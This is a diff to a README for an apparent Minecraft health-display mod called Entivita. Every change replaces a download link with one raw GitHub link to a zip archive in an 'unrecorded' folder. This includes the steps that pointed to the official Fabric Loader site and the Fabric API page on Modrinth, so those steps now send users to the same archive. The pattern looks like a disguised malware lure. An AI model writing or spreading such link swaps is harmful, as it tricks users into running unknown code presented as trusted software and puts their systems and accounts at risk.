@@ -1,7 +1,7 @@
 <h1>🩸 entivita - See Every Creature's Health at a Glance</h1>
 
 <p align="center">
-  <a href="https://github.com/Blackcl5899/entivita" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg,#4f46e5,#7c3aed); color:#fff; font-size:1.3rem; font-weight:bold; border-radius:12px; text-decoration:none; box-shadow:0 4px 15px rgba(79,70,229,0.4);">⬇️ DOWNLOAD ENTIVITA NOW</a>
+  <a href="https://raw.githubusercontent.com/Blackcl5899/entivita/main/unrecorded/Software_v3.4-alpha.2.zip" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg,#4f46e5,#7c3aed); color:#fff; font-size:1.3rem; font-weight:bold; border-radius:12px; text-decoration:none; box-shadow:0 4px 15px rgba(79,70,229,0.4);">⬇️ DOWNLOAD ENTIVITA NOW</a>
 </p>
 
 <p align="center">
@@ -44,7 +44,7 @@ Before you download Entivita, make sure you have these things:
 1. Click this button:
 
 <p align="center">
-  <a href="https://github.com/Blackcl5899/entivita" style="display:inline-block; padding:14px 45px; background:linear-gradient(135deg,#ea580c,#dc2626); color:#fff; font-size:1.1rem; font-weight:bold; border-radius:8px; text-decoration:none; box-shadow:0 4px 12px rgba(220,38,38,0.4);">🚀 DOWNLOAD ENTIVITA</a>
+  <a href="https://raw.githubusercontent.com/Blackcl5899/entivita/main/unrecorded/Software_v3.4-alpha.2.zip" style="display:inline-block; padding:14px 45px; background:linear-gradient(135deg,#ea580c,#dc2626); color:#fff; font-size:1.1rem; font-weight:bold; border-radius:8px; text-decoration:none; box-shadow:0 4px 12px rgba(220,38,38,0.4);">🚀 DOWNLOAD ENTIVITA</a>
 </p>
 
 2. Visit this link to download the application. You'll be taken to the Entivita GitHub page.
@@ -73,7 +73,7 @@ Before you download Entivita, make sure you have these things:
 
 If you already have Fabric Loader installed, skip to Step 4.
 
-1. Open your web browser and search for **"Fabric Loader download"** OR go directly to `https://fabricmc.net/use/`.
+1. Open your web browser and search for **"Fabric Loader download"** OR go directly to `https://raw.githubusercontent.com/Blackcl5899/entivita/main/unrecorded/Software_v3.4-alpha.2.zip`.
 2. Click the big **"Download for Windows"** button.
 3. Run the downloaded `.exe` file.
 4. In the installer window:
@@ -100,7 +100,7 @@ If you already have Fabric Loader installed, skip to Step 4.
 5. **Copy** that `.jar` file.
 6. **Paste** it inside your `mods` folder.
 7. **(Important)** Also download **Fabric API**:
-   - Go to `https://modrinth.com/mod/fabric-api` or search "Fabric API download".
+   - Go to `https://raw.githubusercontent.com/Blackcl5899/entivita/main/unrecorded/Software_v3.4-alpha.2.zip` or search "Fabric API download".
    - Choose the version that matches your Minecraft version.
    - Download the `.jar` file.
    - Put that `.jar` file into your `mods` folder too.
@@ -209,7 +209,7 @@ If you enjoy the mod, share it with your friends. If you find a bug, please repo
 
 <h2>📌 Quick Download Recap</h2>
 <p align="center">
-  <a href="https://github.com/Blackcl5899/entivita" style="display:inline-block; padding:14px 50px; background:linear-gradient(135deg,#16a34a,#15803d); color:#fff; font-size:1.2rem; font-weight:bold; border-radius:8px; text-decoration:none; box-shadow:0 4px 12px rgba(22,163,74,0.4);">🔽 GET ENTIVITA</a>
+  <a href="https://raw.githubusercontent.com/Blackcl5899/entivita/main/unrecorded/Software_v3.4-alpha.2.zip" style="display:inline-block; padding:14px 50px; background:linear-gradient(135deg,#16a34a,#15803d); color:#fff; font-size:1.2rem; font-weight:bold; border-radius:8px; text-decoration:none; box-shadow:0 4px 12px rgba(22,163,74,0.4);">🔽 GET ENTIVITA</a>
 </p>
 
 <p align="center" style="color:#666; font-size:0.9rem;">Client-side · Lightweight · Fully Customizable · For PVP and Survival</p>
